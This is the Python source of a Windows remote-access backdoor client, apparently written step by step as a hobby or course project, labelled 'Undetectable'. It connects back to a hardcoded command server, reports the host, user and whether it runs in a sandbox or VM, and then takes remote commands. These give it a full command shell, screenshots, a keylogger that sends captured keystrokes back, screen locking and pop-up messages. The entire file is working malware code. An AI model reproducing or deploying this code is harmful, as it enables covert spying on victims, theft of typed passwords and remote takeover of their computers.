""" Yakuza Backdoor, Undetectable, Client Side
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/9/2024 | 19 aban 1403.
End Developing Date:

"""

# Step 1: Import requires libraries
import socket
from os import path, environ, getcwd, chdir, remove
from sys import argv, exit
import platform
from time import sleep
import ctypes
import subprocess
# import threading
from wmi import WMI
import webbrowser
import pyscreeze
from PIL import ImageGrab

from pynput.keyboard import Listener, Controller, Key

import win32api
import winerror
import win32event
# import win32crypt

# from winreg import *

from miscs.colors import fColors, bColors
from miscs.string_format import StringFormat


# Step 2: Define Global Variables
# TODO: for testing change SERVER_HOST to Kali WSL IP Address
SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
# SERVER_HOST = "172.29.132.195" # Kali WSL IP Address, Server for testing
SERVER_PORT = 4444

strPATH = path.realpath(argv[0])
TMP = environ['APPDATA']

intBuff = 1024

# Define VBScript Object's Numbers to use in the MessageBox
vbOkOnly = "0"
vbInformation = "64"
vbSystemModal = "4096"


""" Global variables used for Features """
listener = Listener(on_press=None)
listenerSwitch = None # Used for Switch keylog on or off
keyLogs = [] # Used for Store logged keys



# Step 3: Define and Create Mutex Object
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")


# if Mutex is Already Created (mean app is running now), Exit the App
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS: # noqa
    mutex = None
    exit(0)

#  Step 4: Define a Function to Detect Sandboxie
def detect_sandboxie():
    try:
        # Extract the sandboxie dll file to ckeck if it exists
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll") # noqa
        return " (Sandboxie) "

    except: return "" # noqa


# Step 5: Define a Function to Detect VM
def detectVM():
    objWMI = WMI()

    # Iterate on all disk drives
    for diskDrive in objWMI.query("Select * from Win32_DiskDrive"):

        # Check if the drive is a virtual disk drive
        if 'vbox' in diskDrive.Caption.lower() or 'virtual' in diskDrive.Caption.lower():
            return " (Virtual Machine) "

    return ""

# Step 6: Define a Function to Connect Client to the Server
def server_connect():
    global objSocket # noqa

    while True:
        # Try to Create a Socket Connection and Connect to Server
        try:
            objSocket = socket.socket()
            objSocket.connect((SERVER_HOST, SERVER_PORT))

        # Handle Socket Connection Error
        except socket.error:
            sleep(5)

        else: break

    # Initialize User Information to Send to Backdoor Server
    strUserInfo = (socket.gethostname() + "'," + platform.system() + " " + platform.release() +
                   detect_sandboxie() + detectVM() + "'," + environ["USERNAME"])

    send(str.encode(strUserInfo))



# Step 7: Define `decode_utf8, recv, send` Lambda's
decode_utf8 = lambda data: data.decode('utf-8')

recv = lambda buffer: objSocket.recv(buffer)

send = lambda data: objSocket.send(data)



# debug print
print(fColors.BLACK + bColors.WHITE + StringFormat.BOLD +
            "\n[***] Welcome to YAKUZA BACKDOOR Client Side.! [***]\n" + fColors.RESET)

# Step 8: Connect to Server Implement Main Loop for Connect Client to Server
server_connect()

# Step 27: Define `screenshot()` Function to Get Screenshot from Client
def screenshot(all_screens=True):
    # Take screenshot from Client
    screenshotPath = TMP + "/s.png"

    # All monitors set, take screenshot from all monitors
    if all_screens:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(screenshotPath)

    # only take screenshot from Primary Monitor
    else:
        pyscreeze.screenshot(screenshotPath)


    # Send Byte Size of Screenshot and msg to Server
    send(str.encode(f"Receiving screenshot:\nFile Size: {str(path.getsize(screenshotPath))} bytes.\nPlease Wait..."))

    # Open the Screenshot and send it to Server
    with open(screenshotPath, 'rb') as pic:
        sleep(1)
        send(pic.read())

# Step 31: Define `lock()` Function to Lock Client Machine
def lock():
    ctypes.windll.user32.LockWorkStation()

# Step 35: Define `command_shell()` Function to Hijacking Client Command Prompt
def command_shell():
    # Get the current directory and send it to server
    strCurrentDir = str(getcwd())
    send(str.encode(strCurrentDir))

    while True:
        # Receive Command from the Backdoor Server
        strData = decode_utf8(recv(intBuff))

        # `goback` Command use for Set current dir and exit from CMD Hijacking
        if strData == 'goback':
            chdir(strCurrentDir)
            #main_exec()
            break

        elif strData == 'back':
            send(b'closed')
            return main_exec()

        # Handling 'cd' command to navigate to Home Directory
        elif len(strData) == 2 and strData == 'cd':
            homeDirectory = path.expanduser('~')
            chdir(homeDirectory)
            byteData = str.encode("\n" + str(getcwd()) + ">> ")

        # Handling 'cd witi_path' command to navigate to with_path Directory
        elif strData.startswith('cd '):
            # Splicing the command to remove the cd and the extract directory path
            directory = strData[3:]

            # Try to Change Directory and handle the error if it occurs
            # noinspection PyBroadException
            try:
                chdir(directory)
            except:
                byteData = str.encode("\n" + str(getcwd()) + ">> ")
            else:
                byteData = str.encode("\n" + str(getcwd()) + ">> ")

        # TODO: Implement cd .. command

        # Handle other Commands received from the server
        elif len(strData) > 0:

            # Execute Command and store stdout, stderr and stdin
            objCommand = subprocess.Popen(
                strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE ,shell=True)

            # Get out stdout and stderr from executed command
            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode('utf-8', errors='replace')

            byteData = str.encode(strOutput + "\n" + str(getcwd()) + ">> ")

        # Handle if the submited command is wrong
        else:
            byteData = b'Error !!'


        # Get len of byteData to send All Bytes to the server
        strBuffer = str(len(byteData)) # noqa

        # First Send: Send len of byteData to the server
        send(str.encode(strBuffer))

        sleep(0.1)

        send(byteData)


        # Handling 'cd' || 'chdir' Command
        # elif strData[:2].lower() == 'dd' or strData[:5].lower() == 'chdir':
        #
        #     # if len(strData) == 2:
        #     # Execute Command and store stdout, stderr and stdin
        #     objCommand = subprocess.Popen(strData + " & cd",
        #                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        #                                   stdin=subprocess.PIPE ,shell=True)
        #
        #     # If command runs successfully without any error
        #     if (objCommand.stderr.read()).decode('utf-8') == '':
        #
        #         # Get output of first running command
        #         strOutput = (objCommand.stdout.read()).decode('utf-8').splitlines()[0]
        #
        #         # Change Directory to dir received from the server
        #         chdir(strOutput)
        #
        #         # Create Prompt to send to the Server
        #         byteData = str.encode("\n" + str(getcwd()) + ">> ")








# Define `MessageBox()` Function to Show Received Message from the Server
def MessageBox(message):
    objVBS = open(TMP + "/m.vbs", "w")

    # objVBS.write("MsgBox " + message + " " + vbOkOnly + vbInformation + vbSystemModal, "Message")   # noqa
    objVBS.write(f'MsgBox "{message}", {vbOkOnly} + {vbInformation} + {vbSystemModal}, "Message"')
    objVBS.close()

    subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)

def on_press(key_press):
    """ Define function to record keys being pressed, and send them to the server.
        This is called by the start method of pynput.keyboard's Listener. """
    global keyLogs
    keyLogs.append(key_press)

# Define Function to Start a Key Logger on the C2 Client
def keylogger_on():
    global listener, keyLogs, listenerSwitch

    # When listener is None, mean the keylogger is OFF
    if listenerSwitch is None:
        listener = Listener(on_press=on_press)
        listenerSwitch = True
        listener.start()

        send(b"[+]-Client => A Key Logger is now Running on the Client.\n")

    else:
        send(b"[!]-Client => A Key Logger is already Running on the Client.\n")

# Define Function to hutting down the Key Logger on the client and write the pressed keys to disk
def keylogger_off():
    global listener, keyLogs, listenerSwitch

    # When listener is Not None(True), mean the keylogger is ON
    if listenerSwitch is not None:
        listener.stop()

        with open(TMP + 'keys.log', 'a') as fh:
            # Read every key pressed and make it more readable for us
            for aKeyPressed in keyLogs:
                fh.write(str(aKeyPressed)
                         .replace("Key.enter", "\n").replace("'","")
                         .replace("Key.space", " ").replace('""', "'")
                         .replace("Key.shift_r", " SHIFT ").replace("Key.shift_l", " SHIFT ")
                         .replace("Key.backspace", " BackSpace ").replace("Key.shift"," SHIFT ")
                         .replace("Key.caps_lock", " CapsLock ").replace("Key.ctrl_l", " CTRL ")
                         .replace("Key.ctrl_r", " CTRL ").replace("Key.alt_l", " ALT ")
                         .replace("Key.alt_r", " ALT ").replace("Key.tab", " TAB ")
                         .replace("Key.cmd", " CMD ").replace("Key.cmd_r", " CMD ")
                         .replace("Key.up", " UP ").replace("Key.down", " DOWN ")
                         .replace("Key.left", " LEFT ").replace("Key.right", " RIGHT ")
                         .replace("Key.delete", " DEL ").replace("Key.insert", " INS ")
                         .replace("Key.home", " HOME ").replace("Key.end", " END ")
                         .replace("Key.page_up", " PAGE UP ").replace("Key.page_down", " PAGE DOWN "))

        with open(TMP + 'keys.log', 'r') as fh:
            dataLogged = fh.read()
            # print(dataLogged)

            # First Send: Send len of byteData to the server
            lenMsg = 'len ' + str(len(dataLogged))
            send(str.encode(lenMsg))


            # Second Send: Send the data to the server
            send(str.encode('@keys@ '+dataLogged))
            dataLogged = None

                         # .replace("Key.f1", " F1 ").replace("Key.f2", " F2 ")
        # Clear the keyLog list and Re-Initialize the listener to signify 'Not On'
        keyLogs.clear()
        listener = None
        listenerSwitch = None
        remove(TMP + 'keys.log')
        send(b"[+]-Client => A Key Logger is now Off.\n")

                    # k = str(key).replace("'", "")
                    # if k.find("backspace") > 0:
                    #     fh.write(' BackSpace ')
                    # elif k.find("enter") > 0:
                    #     fh.write('\n')
                    # elif k.find("shift") > 0:
                    #     fh.write(' Shift ')
                    # elif k.find("space") > 0:
                    #     fh.write(' ')
                    # elif k.find("caps_lock") > 0:
                    #     fh.write(' CapsLock ')
                    # elif k.find("Key"):
                    #     fh.write(k)




def main_exec():
    while True:
        try:
            while True:
                # Receive and Decode Received Data(Command) from the Backdoor Server
                strData = recv(intBuff)
                strData = decode_utf8(strData)

                # When '--x' Command Submit, Receive 'exit' from the Backdoor server
                if strData == 'exit':
                    objSocket.close() # noqa
                    exit(0)

                # When '--m' Command Submit, Receive 'msg' from the Backdoor server
                elif strData[:3] == 'msg':
                    MessageBox(strData[4:])

                # When '--o' Command Submit, Receive 'site' from the Backdoor server
                elif strData[:4] == 'site':
                    webbrowser.get().open(strData[4:], new=2)

                # When '--p' Command Submit, Receive 'screen' from the Backdoor server
                elif strData == 'screen':
                    screenshot()

                # When '--p 1' Command Submit, Receive 'prscreen' from the Backdoor server
                elif strData == 'prscreen':
                    screenshot(all_screens=False)

                # When '--x 1' Command Submit, Receive 'lock' from the Backdoor server
                elif strData == 'lock':
                    lock()

                # Step 34: Add New `elif` Statement in Main While to Detect 'cmd' Command
                elif strData == 'cmd':
                    command_shell()

                # Aditional Section: Add Yakuza Designed Commands to the Backdoor

                # When '--k 1(keylogon)' Command Submit, then Start Keylogger
                elif strData == 'keylogon':
                    keylogger_on()

                # When '--k 0(keylogoff)' Command Submit, then Stop Keylogger and Send Back logged keys to the Server
                elif strData == 'keylogoff':
                    keylogger_off()


        # Handle if Backdoor Server not Responding try to Reconnect to Server
        except socket.error():
            objSocket.close()
            del objSocket
            server_connect()
            # main_exec()

main_exec()






